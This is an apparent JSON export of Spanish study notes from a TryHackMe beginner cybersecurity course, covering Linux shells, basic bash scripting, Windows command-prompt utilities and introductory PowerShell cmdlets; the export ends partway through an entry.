    "content": "Como la Command Prompt o la PowerShell en Windows, Linux tiene diferente consolas disponibles.\n\nPara ver nuestra consola actual podemos escribir `echo $SHELL`. El archivo `/etc/shells` contiene todas las consolas disponibles instaladas en nuestro sistema. Para listarlas: `cat /etc/shells`.\n\nSi quieres abrir una de las shells que se muestran, como por ejemplo `/usr/bin/zsh`, lo √∫nico que tienes que hacer es teclear su nombre en tu l√≠nea de comandos (`zsh`).\n\nSi quieres cambiar tu shell predeterminada a otra, puedes usar el comando: `chsh -s /usr/bin/zsh` (change shell).\n\nVamos a ver algunas de las shells m√°s usadas:\n\n------------------\n<h2>Bourne Again Shell</h2>\nEs la consola por defecto de la mayor√≠a de distros Linux. Antes de Bash exist√≠an diferentes consolas como sh, ksh y csh. Bash lleg√≥ para unir funcionalidades y mejorarlas. Estas son algunas de las habilidades √∫nicas de Bash:\n\n- Capacidad de scripting.\n- Habilita la tabulaci√≥n para el autocompletado de rutas y comandos.\n- Guarda un historial de todos los comandos usados. Puedes tanto usar las flechas de arriba y abajo o escribir `history` para verlos.\n\n-----------------\n<h2>Friendly Interactive Shell</h2>\nFISH no est√° por defecto en la mayor√≠a de distribuciones. Como indica su nombre, se centra m√°s en ser f√°cil para el usuario que otras consolas. Algunos de los puntos clave son:\n\n- Ofrece una sintaxis muy sencilla.\n- Tiene autocorrecci√≥n de errores en los comandos que escribes.\n- Puedes personalizar la l√≠nea de comandos.\n- Tiene un resaltado de sintaxis muy interesante.\n- Ofrece scripting, autocompletado con tabulaci√≥n e historial de comandos.\n\n-----------------\n<h2>Z Shell</h2>\nEsta tampoco esta instalada en la mayor√≠a de distribuciones. Se considera una shell moderna que combina funcionalidades de algunas shells anteriores. Algunas de sus caracter√≠sticas son:\n\n- Autocompletado por tabulaci√≥n avanzado y capacidad de scripting.\n- Autocorrecci√≥n de comandos.\n- Ofrece personalizaci√≥n extendida (lo que puede hacerla m√°s lenta que otras shells).\n- Ofrece historial de comandos y muchas otras funcionalidades.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction to Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/1-introduction-to-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/1. Introduction to Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "Usar una CLI te da m√°s opciones y poder sobre las decisiones que envuelven a tu sistema operativo.\n\n<h2>Objetivos de Aprendizaje</h2>\n- Aprender interacci√≥n con una consola Linux.\n- Usar comandos b√°sicos de Shell.\n- Explorar los tipos de Shells de Linux disponibles.\n- Escribir algunos scripts.\n\n<h2>Pre-requisitos</h2>\n[[2. Linux Fundamentals]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Shell Scripting and Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/4-shell-scripting-and-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/4. Shell Scripting and Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "Un script de Shell no es nada m√°s que un conjunto de comandos. Sup√≥n una tarea repetitiva que requiere que introduzcas m√∫ltiples comandos usando una consola. En vez de meter uno a uno manualmente puedes escribir un documento que sirva como una lista de tareas para el ordenador.\n\nEl primer paso es abrir un editor de texto en la consola, puede ser nano, vi, vim, nvim, etc. Llamaremos al script `loquesea.sh`. El `.sh` realmente no es necesario, pero nos ayuda a la hora de identificar scripts.\n\nTodos los scripts pueden ejecutarse sin lo que se conoce como shebang o hashbang (`#!`). Sin embargo, es preferible ponerlo ya que nos facilitar√° la ejecuci√≥n que cambiar√° de `/usr/bin/bash script.sh` (sin el hashbang) a `./script.sh` (con √©l). Este siempre se debe de poner en la primera l√≠nea del script, y dependiendo del lenguaje que utilicemos en el script y de d√≥nde est√© alojado en nuestro sistema ser√° uno u otro.\n\nEn nuestro caso `vi first_script.sh` -> `#!/bin/bash`.\n\n------------\n<h2>Variables</h2>\nUna variable guarda contenido dentro de ella. Supongamos que usamos un valor complejo, como una URL. en vez de escribir esta muchas veces, podemos guardarla en una variable con un nombre sencillo y ponerla cuando lo necesitemos.\n\nEn el siguiente script veremos como se pregunta por el nombre, se guarda en una variable y por √∫ltimo se muestra por pantalla:\n\n```bash\n#!/bin/bash\n\necho \"Hey, what's your name?\"\nread name\necho \"Welcome, $name\"\n```\n\nPara ejecutar este script, tenemos que darle permisos. Esto lo podemos hacer con el comando `chmod +x <archivo>`. La notaci√≥n es **r** para leer, **w** para escribir y **x** para ejecutar, **+** para dar y **-** para quitar. En su defecto podemos usar la notaci√≥n octal si nos resulta m√°s f√°cil.\n\nUna vez tiene permisos lo ejecutamos haciendo uso de `./` antes del ejecutable. Esto le dice a la shell que ejecute el archivo que est√° en este directorio.\n\n--------------------\n<h2>Bucles</h2>\nComo su propio nombre da a entender, es algo que se repite. Por ejemplo, tienes una lista de muchos amigos y quieres mandarles el mismo mensaje. En vez de mandar todos de manera individual, puedes hacer un bucle que repita el proceso de mandar el mensaje.\n\n```bash\n#!/bin/bash\n\nfor i in {1..10};do\n\techo $i\ndone\n```\n\nLa variable `i` es el iterador, puede tener el nombre que tu quieras. Este se ejecutara de 1 a 10. El `do` indica el comienzo del bucle y `done` el final. El comando `echo $i` imprimir√° la variable `i` de cada iteraci√≥n.\n\n--------------------\n<h2>Condicionales</h2>\nSon una parte especial del scripting, nos ayudan a ejecutar cierta parte del c√≥digo s√≥lo si una condici√≥n se cumple. Imagina que hay un secreto que s√≥lo quieres que vea un usuario:\n\n```bash\n#!/bin/bash\n\necho \"Please enter your name first:\"\nread name\nif [ \"$name\" = \"Stewart\" ]; then\n        echo \"Welcome Stewart! Here is the secret: THM_Script\"\nelse\n        echo \"Sorry! You are not authorized to access the secret.\"\nfi\n```\n\nEl script de arriba te pide un nombre. Si introduces el correcto te da el secreto. Si no, te dice que no est√°s autorizado.\n\n--------------------\n<h2>Comentarios</h2>\nA veces el c√≥digo puede ser muy complejo, o queremos que otros usuarios tengan facilidad para entenderlo, en este caso, podemos comentar el c√≥digo para dar indicaciones, explicaciones o hacerlo m√°s legible. \n\nPara comentar en bash podemos usar `#`. Los comentarios no afectan a la ejecuci√≥n del c√≥digo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. The Locker Script",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/5-the-locker-script/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/5. The Locker Script.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "En la tarea anterior hemos estudiado variables, bucles, condicionales y comentarios.\n\n--------------\n<h2>Requerimiento</h2>\nUn usuario tiene una taquilla en un banco. Para securizar la taquillas, tenemos que tener un script que verifique el usuario en primer lugar. Cuando el usuario introduzca su usuario, nombre de la compa√±√≠a y PIn, deber√≠a dejarle acceder.\n\n```bash\n#!/bin/bash \n\n# Defining the variables\nusername=\"\"\ncompanyname=\"\"\npin=\"\"\n\n# Defining the loop\nfor i in {1..3}; do\n# Defining the conditional statements\n        if [ \"$i\" -eq 1 ]; then\n                echo \"Enter your Username:\"\n                read username\n        elif [ \"$i\" -eq 2 ]; then\n                echo \"Enter your Company name:\"\n                read companyname\n        else\n                echo \"Enter your PIN:\"\n                read pin\n        fi\ndone\n\n# Checking if the user entered the correct details\nif [ \"$username\" = \"John\" ] && [ \"$companyname\" = \"Tryhackme\" ] && [ \"$pin\" = \"7385\" ]; then\n        echo \"Authentication Successful. You can now access your locker, John.\"\nelse\n        echo \"Authentication Denied!!\"\nfi\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Todo el mundo prefiere una interfaz gr√°fica (GUI) hasta que masteriza una interfaz de linea de comandos (CLI). Esto se puede deber a que es m√°s intuitiva para la mayor√≠a de usuarios.\n\nlas CLIs normalmente tiene una curva de aprendizaje, pero cuanto m√°s las uses, m√°s r√°pido te dar√°s cuenta de que son m√°s eficientes y r√°pidas. Por ejemplo, ¬øcu√°ntos clicks tienes que hacer para encontrar tu IP en una GUI? Con una CLI es un comando.\n\nHay muchas otras ventajas de usar una CLI:\n\n- Uso reducido de recursos: Requieren menos recursos por lo que pueden funcionar en equipos de hardware limitado o antiguo.\n- Automatizaci√≥n: Aunque puedes automatizar tareas en una GUI, crear un script de bash con los comandos que deseas repetir es mucho m√°s sencillo.\n- Gesti√≥n remota: Una CLI hace muy sencillo el uso de SSH para manejar remotamente un sistema.\n\n--------------------------\n<h2>Objetivos de aprendizaje</h2>\nEl objetivo de esta unidad es ense√±ar a usar `cmd.exe`, el MS Windows Command Prompt.\n\n- Mostrar informaci√≥n b√°sica.\n- Comprobar y arreglar errores de la configuraci√≥n de red.\n- Controlar archivos y ficheros.\n- Comprobar los procesos corriendo.\n\n--------------------\n<h2>Pre-requisitos</h2>\nPara empezar esta lecci√≥n es necesario haber completado [[3. Windows and AD Fundamentals]].\n\n-------------------\n<h2>Establecer una conexi√≥n SSH</h2>\nNos conectaremos a la m√°quina mediante SSH. Para poder hacerlo necesitaremos usar la VPN de la plataforma: `sudo openvpn <ruta_vpn>`. Despu√©s, desde la terminal, ejecutaremos el comando: `ssh <usuario>@<direccion_ip>.\n\nCredenciales:\n\n- Usuario: `user`\n- Contrase√±a: `Tryhackme123!`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Windows Command Line",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/0-windows-command-line/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/0. Windows Command Line.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/1. Introduction]]\n[[2. Basic System Information]]\n[[3. Network Troubleshooting]]\n[[4. File and Disk Management]]\n[[5. Task and Process Management]]\n[[6. Conclusion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/6-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/6. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Intencionalmente hemos omitido algunos comandos durante esta lecci√≥n porque no ten√≠an mucho sentido en una lecci√≥n para principiantes. De cualquier forma, aqu√≠ los comentamos:\n\n- `chkdsk`: Comprueba el sistema y los vol√∫menes de discos en busca de errores o sectores da√±ados.\n- `driverquery`: Muestra una lista de dispositivos instalados.\n- `sfc /scannow`: Escanea los archivos del sistema en busca de corrupciones y las repara si puede.\n\nEl comando `shutdown /s` sirve para apagar el sistema, si queremos reiniciarlo podr√≠amos usar `shutdown /r`. Con `shutdown /a` podemos abortar un apagado del sistema.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Basic System Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/2-basic-system-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/2. Basic System Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Antes de introducir ning√∫n comando debemos saber que s√≥lo podemos usar comandos que se encuentren dentro del path. Para ver el path, podemos usar el comando `set`.\n\nPara ver la versi√≥n del sistema operativo, podemos usar el comando `ver`.\n\nPara descubrir m√°s informaci√≥n sobre el sistema podemos usar el comando `systeminfo`.\n\nUn par de consejos:\n\n- Si el output es muy largo, podemos pipearlo por `more` (`drverquery | more`). As√≠ podemos verlo p√°gina a p√°gina presionando el espacio.\n- `help` nos brinda informaci√≥n del comando que elijamos.\n- `cls` limpia la pantalla.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. File and Disk Management",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/4-file-and-disk-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/4. File and Disk Management.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Hemos visto c√≥mo obtener informaci√≥n b√°sica del sistema. Ahora aprenderemos a movernos por los directorios y archivos.\n\n------------------\n<h2>Trabajando con directorios</h2>\nPodemos usar `cd` sin par√°metros para mostrar el drive actual y el directorio actual. Podemos ver los directorios hijos usando `dir`. Con este √∫ltimo comando tenemos la opci√≥n de mostrar incluso aquellos ocultos (`dir /a`) o mostrar archivos en el directorio actual y todos los subdirectorios (`dir /s`).\n\nPara obtener una representaci√≥n visual de directorios y archivos podemos usar `tree`.\n\nPara navegar a cualquier directorio podemos usar `cd <nombre_directorio>`. Para volver atr√°s podemos usar `cd ..`.\n\nPara crear un directorio usamos `mkdir` y para eliminar un directorio vac√≠o `rmdir`.\n\n-------------------\n<h2>Trabajando con archivos</h2>\nPodemos ver f√°cilmente archivos de texto con el comando `type <archivo>`.\n\nEl comando `copy` nos permite copiar archivos de un sitio a otro.\n\nCon el comando `move` podemos moverlos de un sitio a otro.\n\nPara borrar un archivo podemos usar `del` o `erase`.\n\n>[!TIP] Podemos usar el asterisco para referirnos a todos los archivos, por ejemplo `copy *.md C:\\Markdown` para copiar todos los archivos con extensi√≥n .md a la carpeta Markdown.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Network Troubleshooting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/3-network-troubleshooting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/3. Network Troubleshooting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "La mayor√≠a de nosotros estamos acostumbrados a mirar la configuraci√≥n de red de MS Windows desde la GUI. Sin embargo, la CLI nos da bastantes comandos para mirar la configuraci√≥n, comprobar las conexiones en curso y reparar errores de red.\n\n------------------\n<h2>Configuraci√≥n de Red</h2>\nPara comprobar nuestra configuraci√≥n de red podemos usar el comando `ipconfig`. Si queremos m√°s informaci√≥n todav√≠a, podemos usar el comando `ipconfig /all`.\n\n-----------------------\n<h2>Resoluci√≥n de problemas de Red</h2>\nUna resoluci√≥n com√∫n es comprobar si el servidor puede acceder a un servidor particular en Internet. La sintaxis es la siguiente: `ping <nombre_servidor>`. Inspirado en el ping-pong, mandamos un paquete ICMP (ping) y esperamos por una respuesta (pong).\n\nOtra herramienta valiosa es `tracert` (trace route). El comando `tracert <nombre_servidor>` rastrea la ruta de red atravesada para llegar al objetivo.\n\n-----------------------\n<h2>M√°s comandos de Red</h2>\nOtro comando bueno de conocer es `nslookup`. Este nos permite buscar la direcci√≥n IP de un dominio (`nslookup <nombre_servidor>`).\n\nEl √∫ltimo comando que trataremos en esta unidad ser√° `netstat`. Este comando muestra conexiones actuales y puertos en escucha. Para ver m√°s opciones referentes a este comando podemos usar `netstat -h`. Algunas opciones comunes son:\n\n- `-a`: Muestra todas las conexiones establecidas y puertos en escucha.\n- `-b`: Muestra el comando asociado con cada puerto en escucha y conexi√≥n establecida.\n- `-o`: Muestra el PID asociado con la conexi√≥n.\n- `-n`: Usa una forma num√©rica para las direcciones y puertos.\n\nPodemos combinar estas opciones anteriores en `netstat -abon`. Esto nos deja claro que el ejecutable `sshd.exe` es el responsable de escuchar conexiones entrantes en el puerto 22. Tambi√©n nos permite ver el PID asociado a cada conexi√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Task and Process Management",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/5-task-and-process-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/5. Task and Process Management.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Es probable que est√©s familiarizado con el gestor de tareas de MS Windows y con matar procesos que no responden.\n\nPara listar procesos usamos `tasklist`. Algo de filtrado es √∫til porque el output puede ser muy largo. Puedes ver todos los filtros disponibles con `tasklist /?`. Digamos que queremos ver las tareas relacionadas con `sshd.exe`, podemos hacerlo con `tasklist /FI \"imagename eq sshd.exe\"`. Esto hace filter image name equals sshd.exe.\n\nSabiendo el PID, podemos terminar cualquier proceso usando `taskkill /PID <PID>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. PowerShell Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/3-powershell-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/3. PowerShell Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "<h2>Ejecutando PowerShell</h2>\nPowerShell se puede ejecutar de diferentes maneras.\n\n- Men√∫ de inicio: Escribe `powershell` y haz click en `Windows PowerShell` o `PowerShell`.\n- Run Dialog: Presiona `Win + R` para abrir el run dialog, escribe `powershell` y dale a `Enter`.\n- Explorador de archivos: Escribe `powershell`en la barra de direcciones. Esto abre PowerShell espec√≠ficamente en ese directorio.\n- Gestor de tareas: Abre el task manager, ve a `File -> Run new task`, escribe `powershell` y presiona `Enter`.\n\nTambi√©n puedes ejecutarlo desde la cmd escribiendo `powershell`.\n\n------------------\n<h2>Sintaxis B√°sica: Verbo-Nombre</h2>\nComo ya hemos hablado, los comandos de la PowerShell se llaman `cmdlets` (`command-lets`). Son mucho m√°s poderosos que los comandos de Windows tradicionales.\n\nEstos siguen una norma de nomenclatura consistente `verbo-nombre`. Esto hace f√°cil entender lo que hace cada uno. el verbo describe la acci√≥n y el nombre especifica el objeto sobre el que se aplica la acci√≥n. Por ejemplo:\n\n- `Get-Content`: Devuelve el contenido de un archivo.\n- `Set-Location`: Cambia el directorio actual de trabajo.\n\n-----------------\n<h2>Cmdlets B√°sicos</h2>\nPara ver la mayor√≠a de los cmdlets que podemos usar, hay un comando: `Get-Command`.\n\nPara cada objeto `CommandInfo` devuelto por el cmdlet, algunas propiedades se muestran en pantalla. Es posible filtrar, por ejemplo, si queremos ver s√≥lo los cmdlets de tipo funci√≥n:\n`Get-Command -CommandType \"Function\"`.\n\nOtro cmdlet importante de saber es: `Get-Help`. Devuelve informaci√≥n detallada sobre cmdlets: `Get-Help Get-Date`. Si a√±adimos `-examples` nos devolver√° una lista de ejemplos comunes.\n\nPara hacer m√°s sencillo el cambio para profesionales de IT hacia PowerShell, este cuenta con una lista de aliases, que son comandos que llevan hacia otros cmdlets, por ejemplo `cat -> Get-Content`. Si escribimos cat en la terminal, tendr√° el mismo efecto que escribir Get-Content, que es el cmdlet correcto para la acci√≥n que normalmente suele hacer cat. `Get-Alias` lista todos los aliases disponibles.\n\n---------------\n<h2>D√≥nde Encontrar y Descargar cmdlets</h2>\nOtra poderosa funci√≥n de PowerShell es la posibilidad de extender sus funcionalidades descargando cmdlets adicionales de repositorios online.\n\n>[!NOTE] Los cmdlets que veremos ahora requieren conexi√≥n a Internet. Como la m√°quina a la que nos hemos conectado no tiene acceso a Internet, no podremos usarlos.\n\nPara buscar m√≥dulos podemos usar `Find-Module`. A veces, si no sabemos el nombre exacto nos podemos ayudar de `*`, por ejemplo para encontrarlo con mayor facilidad.\n\n```powershell\nPS C:\\Users\\captain> Find-Module -Name \"PowerShell*\"\n\nVersion    Name                                Repository           Description \n-------    ----                                ----------           ----------- \n0.4.7      powershell-yaml                     PSGallery            Powershell module for serializing and deserializing YAML\n\n2.2.5      PowerShellGet                       PSGallery            PowerShell module with commands for discovering, installing, updating and publishing the PowerShell artifacts like Modules, DSC Resources, Role Capabilities and Scripts.                                                   \n1.0.80.0   PowerShell.Module.InvokeWinGet      PSGallery            Module to Invoke WinGet and parse the output in PSOjects\n\n0.17.0     PowerShellForGitHub                 PSGallery\n```\n\nUna vez identificado, el m√≥dulo puede ser instalado con `Install-Module`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "<h2>Objetivos de aprendizaje</h2>\nEn esta lecci√≥n vamos a aprender:\n\n- Aprender sobre PowerShell y sus capacidades.\n- Entender la estructura b√°sica del lenguaje de PowerShell.\n- Aprender y ejecutar algunos comandos b√°sicos de PowerShell.\n- Entender las muchas aplicaciones de la PowerShell en la industria de la ciberseguridad.\n\n----------------\n<h2>Pre-requisitos</h2>\nAntes de empezar aqu√≠ es importante haber entendido el contenido de:\n\n- [[3. Windows and AD Fundamentals]]\n- [[0. Windows Command Line]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What is PowerShell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/2-what-is-powershell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/2. What is PowerShell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell es una plataforma de automatizaci√≥n de tareas que consta de una linea de comandos, un lenguaje de scripting y un marco de control de configuraci√≥n.\n\n-----------------------\n<h2>Una breve historia sobre PowerShell</h2>\nFue desarrollada para sobreponerse a las limitaciones de las herramientas de linea de comandos que hab√≠a. A principios de los 2000, herramientas tradicionales como `cmd.exe` se quedaban cortas para la automatizaci√≥n y el manejo de los sistemas.\n\nJeffrey Snover, un ingeniero de Microsoft, se dio cuenta de que Windows y UNIX manejaban las operaciones del sistema de forma diferente. Windows usaba una estructura de datos y APIs mientras que UNIX trataba todo como archivos. Como esto hac√≠a que migrar las herramientas de UNIX a Windows no fuera pr√°ctico, J. Snover desarroll√≥ con orientaci√≥n a objetos. Fue lanzada en 2006 y en 2016 con la creciente demanda de una herramienta de automatizaci√≥n, Windows lanz√≥ PowerShell Core, de c√≥digo abierto.\n\n-----------\n<h2>El poder en PowerShell</h2>Para poder entender el poder de PowerShell, necesitamos comprender qu√© es un objeto en este contexto.\n\nEn programaci√≥n, un objeto representa un √≠tem con propiedades (caracter√≠sticas) y m√©todos (acciones). Por ejemplo, el objeto `coche` tendr√≠a propiedades `color`, `modelo`, `nivelDeGasolina` y m√©todos como `conducir()`, `tocarBocina()` o `repostar()`.\n\nDe forma similar, en PowerShell los objetos son unidades de informaci√≥n fundamentales que pueden contener nombres, usuarios, propiedades y m√©todos.\n\nEn la command shell tradicional, los comandos est√°n basados en texto, significando que sus procesos nos dan informaci√≥n en texto plano. Por el contrario, cuando un cmdlet (comand-let) se ejecuta en PowerShell, devuelve un objeto que almacena informaci√≥n, lo que da pie a manipulaci√≥n de la informaci√≥n m√°s flexible y potente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Navigating the File System and Working with Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/4-navigating-the-file-system-and-working-with-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/4. Navigating the File System and Working with Files.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell nos ofrece un rango de cmdlets para navegar por el sistema de ficheros y gestionar archivos.\n\nSimilar a `dir` (o `ls` en UNIX), `Get-ChildItem` lista los archivos y directorios de una localizaci√≥n especificada con el par√°metro `-Path`. Si no se especifica la ruta, se tomar√° por defecto la actual.\n\nPara navegar a un directorio diferente podemos usar `Set-Location`. Es el hom√≥logo de `cd`.\n\nPara crear cualquier cosa podemos usar `New-Item`. Despu√©s especificamos la ruta y qu√© tipo de √≠tem es. De forma similar, para borrar un √≠tem: `Remove-Item`.\n\nPara copiar y mover: `Copy-Item` y `Move-Item`.\n\nPara leer los contenidos de un archivo, `Get-Content`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. System and Network Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/6-system-and-network-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/6. System and Network Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell fue creada espec√≠ficamente para combatir la necesidad creciente de una herramienta potente de automatizaci√≥n. Como tal, provee una cantidad de cmdlets que nos permite obtener informaci√≥n detallada de la configuraci√≥n del sistema y ajustes de red.\n\nPor ejemplo, `Get-ComputerInfo` nos devuelve una lista de informaci√≥n del sistema que incluye informaci√≥n del sistema operativo, especificaciones de hardware, detalles de la BIOS y m√°s. En contrapartida a u hom√≥logo tradicional, `systeminfo` que s√≥lo devuelve algunos detalles.\n\nEsencial para el manejo de cuentas es `Get-LocalUser` que lista todas las cuentas de usuarios locales en el sistema. Devuelve el nombre de la cuenta, el estado y una breve descripci√≥n.\n\nEl cmdlet `Get-NetIpConfiguration` nos da informaci√≥n detallada sobre las interfaces de red en el sistema, incluyendo la direcci√≥n IP, servidores DNS y configuraciones gateway.\n\nEn caso de que necesitemos detalles espec√≠ficos de las direcciones IP asignadas a las interfaces de red, el cmdlet `Get-NetIpAddress` nos servir√°.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Scripting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/8-scripting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/8. Scripting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "El scripting es el proceso de escribir y ejecutar una serie de comandos en un archivo de texto, conocido como script, para automatizar tareas que un usuario realizar√≠a en una CLI.\n\nDe manera simple, scriptear es como darle a un ordenador una lista de tareas (to-do list). Cada una de las lineas del script representa un comando.\n\nDependiendo de tu equipo los scripts pueden servir para m√∫ltiples cosas:\n\n- Blue team: Puede automatizar tareas como escaneo de logs, detecci√≥n de anomal√≠as o extracci√≥n de indicadores de compromiso.\n- Red team: Puede automatizar tareas como la enumeraci√≥n, ejecuci√≥n remota de comandos y la creaci√≥n de scripts ofuscados para sobrepasar defensas.\n- System administrators: Puede automatizar tareas como el manejo de configuraciones del sistema o securizaci√≥n de redes.\n\nNo podemos acabar esta unidad sin mencionar el cmdlet `Invoke-Command`. Es esencial para ejecutar comandos en sistemas remotos. Puede ser usado para ejecutar payloads o scripts en otros sistemas.\n\n```powershell\nPS C:\\Users\\captain> Get-Help Invoke-Command -examples\n\nNAME\n    Invoke-Command\n    \nSYNOPSIS\n    Runs commands on local and remote computers.\n    \n    ------------- Example 1: Run a script on a server -------------\n    \n    Invoke-Command -FilePath c:\\scripts\\test.ps1 -ComputerName Server01\n    \n    The FilePath parameter specifies a script that is located on the local computer. The script runs on the remote computer and the results are returned to the local computer.\n\n    --------- Example 2: Run a command on a remote server ---------\n\n    Invoke-Command -ComputerName Server01 -Credential Domain01\\User01 -ScriptBlock { Get-Culture }\n\n    The ComputerName parameter specifies the name of the remote computer. The Credential parameter is used to run the command in the security context of Domain01\\User01, a user who has permission to run commands. The ScriptBlock parameter specifies the command to be run on the remote computer.\n\n    In response, PowerShell requests the password and an authentication method for the User01 account. It then runs the command on the Server01 computer and returns the result.\n```\n\nEn el segundo ejemplo vemos que a√±adiendo `-ScriptBlock { ... }` no necesitamos saber scripting pues podemos ejecutar cualquier comando directamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Piping, Filtering, and Sorting Data",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/5-piping-filtering-and-sorting-data/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/5. Piping, Filtering, and Sorting Data.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
